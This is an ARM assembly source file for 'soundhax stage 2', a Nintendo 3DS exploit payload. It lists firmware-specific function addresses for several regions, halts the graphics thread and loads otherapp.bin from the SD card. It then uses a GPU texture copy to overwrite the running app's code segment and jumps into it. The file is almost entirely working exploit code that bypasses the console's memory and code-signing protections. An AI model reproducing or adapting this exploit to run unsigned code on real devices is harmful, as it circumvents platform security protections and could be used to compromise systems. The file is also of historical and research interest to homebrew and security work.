/* soundhax stage 2 */
/* ported by nedwill from freakyhax (plutoo), with permission */

#if defined(USA)

#define GSP_THREAD_OBJ_PTR  0x003BFFF0
#define FS_OPEN_FILE 0x0022929C
#define GSP_GET_HANDLE 0x0021C960
#define GSP_GET_INTERRUPTRECEIVER 0x001C805C
#define GSP_ENQUEUE_CMD 0x001C7BF4

#if defined(V21AND22)

#define FS_READ_FILE 0x002C41F4
#define GSP_GX_CMD4 0x002E9380
#define GSP_FLUSH_DATA_CACHE 0x002E2940

#else

#define FS_READ_FILE 0x002C4204
#define GSP_GX_CMD4 0x002E9390
#define GSP_FLUSH_DATA_CACHE 0x002E2950

#endif

#elif defined(EUR)

#define GSP_THREAD_OBJ_PTR  0x003C0010
#define FS_OPEN_FILE 0x0022929C
#define GSP_GET_HANDLE 0x0021C960
#define GSP_GET_INTERRUPTRECEIVER 0x001C805C
#define GSP_ENQUEUE_CMD 0x001C7BF4

#if defined(V21AND22)

#define FS_READ_FILE 0x002C4364
#define GSP_GX_CMD4 0x002E94F0
#define GSP_FLUSH_DATA_CACHE 0x002E2AB0

#else

#define FS_READ_FILE 0x002C4374
#define GSP_GX_CMD4 0x002E9500
#define GSP_FLUSH_DATA_CACHE 0x002E2AC0

#endif

#elif defined(JPN)

#define GSP_THREAD_OBJ_PTR  0x003BFFB0
#define FS_OPEN_FILE 0x0022929C
#define GSP_GET_HANDLE 0x0021C960
#define GSP_GET_INTERRUPTRECEIVER 0x001C805C
#define GSP_ENQUEUE_CMD 0x001C7BF4

#if defined(V21AND22)

#define FS_READ_FILE 0x002C40CC
#define GSP_GX_CMD4 0x002E9258
#define GSP_FLUSH_DATA_CACHE 0x002E2818

#else

#define FS_READ_FILE 0x002C40DC
#define GSP_GX_CMD4 0x002E9268
#define GSP_FLUSH_DATA_CACHE 0x002E2828

#endif

#elif defined(KOR)

#if defined(V21AND22)
#error "KOR region supported for this firmware version"
#endif

#define SRV_SESSIONHANDLE 0x0038d1c4
#define SRV_SEMAPHORE 0x0038d1b4
#define GSP_THREAD_OBJ_PTR  0x0038CA20
#define GSP_THREAD_OBJ_PTR_OFFSET 0x1C
#define FS_OPEN_FILE 0x0022F094
#define FS_READ_FILE 0x0010C83C
#define GSP_GET_HANDLE 0x00223890
#define GSP_GX_CMD4 0x001318A0
#define GSP_FLUSH_DATA_CACHE 0x0012B728
#define GSP_GET_INTERRUPTRECEIVER 0x00223880
#define GSP_ENQUEUE_CMD 0x0022109C

#else
#error "region not supported"
#endif

#define OTHERAPP_ADDR 0x142C0000
#define OTHERAPP_SIZE 0xC000
#define OTHERAPP_CODE_VA 0x00101000
#ifdef NEW
/* OTHERAPP_CODE_VA + 0x27900000 */
#define OTHERAPP_CODE_PA 0x27a01000
#else
/* OTHERAPP_CODE_VA + 0x23D00000 */
#if defined(POST5)
#define OTHERAPP_CODE_PA 0x23e01000
#else
#define OTHERAPP_CODE_PA 0x23e01000 - 0x78000
#endif
#endif
#define OTHERAPP_CODE_GPU (OTHERAPP_CODE_PA - 0xc000000)

#define PARAMBLK_ADDR 0x14000000

.text
.global _start
_start:
/* Initialize stack. */
    mov  sp, #0x10000000
    sub  sp, #0x2C
/* Tell GSP thread to fuck off. */
    ldr  r0, =GSP_THREAD_OBJ_PTR
#if defined(KOR)
    ldr  r0, [r0,#GSP_THREAD_OBJ_PTR_OFFSET]
#endif
    mov  r1, #1
    strb r1, [r0, #0x77]
    ldr  r0, [r0, #0x2C]
    svc  0x18
#if defined(KOR) //A srv-notification thread is running that can't return from the thread-function. With KOR it's within the otherapp .text range. Overwrite the handle it uses so that it won't return from svcWaitSynchronizationN with the next call. Then send a notification so that it returns from waitsync for using the new handle.
    svc 0x17 @ svcCreateEvent
    ldr r3, =SRV_SEMAPHORE
    str r1, [r3]

    ldr r0, =0x207
    mov r1, #0x1
    bl srv_PublishToSubscriber
#endif
/* Mount SD card. */
//    adr r0, sdmc_str
//    ldr r1, =FS_MOUNT_SDMC
//    blx r1
/* Open otherapp.bin on sdcard root. */
    add  r0, sp, #0xC     // file_handle_out
    adr  r1, otherapp_str // path
    mov  r2, #1           // flags=FILE_READ
    ldr  r3, =FS_OPEN_FILE
    blx  r3
/* Read it into linear memory. */
    ldr  r1, [sp, #0xC] // file_handle
    add  r0, sp, #8     // bytes_read_out
    mov  r2, #0         // offset_lo
    mov  r3, #0         // offset_hi
    ldr  r4, =OTHERAPP_ADDR
    str  r4, [sp]       // dst
    ldr  r4, =OTHERAPP_SIZE
    str  r4, [sp, #4]   // size
    ldr  r4, =FS_READ_FILE
    blx  r4
/* Gspwn it to code segment. */
    ldr  r0, =OTHERAPP_CODE_GPU // dst
    ldr  r1, =OTHERAPP_ADDR // src
    ldr  r2, =OTHERAPP_SIZE // size
    bl   gsp_gxcmd_texturecopy
    bl   small_sleep
/* Grab GSP handle for next payload. */
    ldr  r0, =GSP_GET_HANDLE
    blx  r0
    mov  r3, r0
/* Set up param-blk for otherapp payload. */
    ldr  r0, =PARAMBLK_ADDR
    ldr  r1, =GSP_GX_CMD4
    str  r1, [r0, #0x1C] // gx_cmd4
    ldr  r1, =GSP_FLUSH_DATA_CACHE
    str  r1, [r0, #0x20] // flushdcache
    add  r2, r0, #0x48
    mov  r1, #0x8D       // flags
    str  r1, [r2]
    add  r2, r0, #0x58   // gsp_handle
    str  r3, [r2]
/* smea's magic does the rest. */
    ldr  r0, =PARAMBLK_ADDR  // param_blk
    ldr  r1, =0x10000000 - 4 // stack_ptr
    ldr  r2, =OTHERAPP_CODE_VA
    blx  r2
forever:
    b    forever

.pool
otherapp_str:
    .string16 "$sndsd:/otherapp.bin\0"
    .align 4

/* small_sleep: Sleep for a while. */
small_sleep:
    mov  r0, #0x10000000
    mov  r1, #0
    svc  0x0A // svcSleepThread
    bx   lr

/* gsp_gxcmd_texturecopy: Trigger GPU memcpy. */
gsp_gxcmd_texturecopy:
    push {lr}
    sub  sp, #0x20
    mov  r4, #0

    mov  r5, #4          // cmd_type=TEXTURE_COPY
    str  r5, [sp]
    str  r1, [sp, #4]    // src_ptr=r1
    str  r0, [sp, #8]    // dst_ptr=r0
    str  r2, [sp, #0xC]  // size=r2
    str  r4, [sp, #0x10] // in_dimensions=0
    str  r4, [sp, #0x14] // out_dimensions=0
    mov  r5, #8
    str  r5, [sp, #0x18] // flags=8
    str  r4, [sp, #0x1C] // unused=0

    mov  r0, sp
    bl   gsp_execute_gpu_cmd
    add  sp, #0x20
    pop  {pc}
.pool

gsp_execute_gpu_cmd:
    push {lr}
    mov  r1, r0
    ldr  r4, =GSP_GET_INTERRUPTRECEIVER
    blx  r4
    add  r0, #0x58
    ldr  r4, =GSP_ENQUEUE_CMD
    blx  r4
    pop  {pc}
.pool

#if defined(SRV_SESSIONHANDLE)
srv_PublishToSubscriber:
    push {r4, lr}
    mrc p15, 0, r4, cr13, cr0, 3
    add r4, r4, #0x80

    ldr r2, =0x000C0080
    str r2, [r4, #0]
    str r0, [r4, #4]
    str r1, [r4, #8]

    ldr r0, =SRV_SESSIONHANDLE
    ldr r0, [r0]
    svc 0x32

    cmp r0, #0
    ldrge r0, [r4, #4]
    pop {r4, pc}
.pool
#endif

/* Force assembler error if payload becomes greater than 0x800. */
.org 0x300, 0x45
